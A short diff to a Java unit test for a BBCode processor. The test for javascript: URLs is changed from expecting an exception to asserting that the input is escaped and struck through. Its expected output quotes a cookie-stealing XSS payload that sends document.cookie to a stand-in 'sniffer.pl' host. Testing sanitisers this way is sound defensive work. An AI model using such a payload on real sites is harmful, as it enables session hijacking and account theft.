@@ -32,11 +32,13 @@ public class BBCodeTest {
     assertEquals(TAG_ESCAPE_RESULT, result);
   }
 
-  @Test(expected=BadURLException.class)
+  @Test
   public void testJavascriptURL() throws BadURLException {
     BBCodeProcessor proc = new BBCodeProcessor();
 
-    proc.preparePostText(JAVASCRIPT_URL);
+    String result = proc.preparePostText(JAVASCRIPT_URL);
+
+    assertEquals("<s>javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s>", result);
   }
 
   @Test
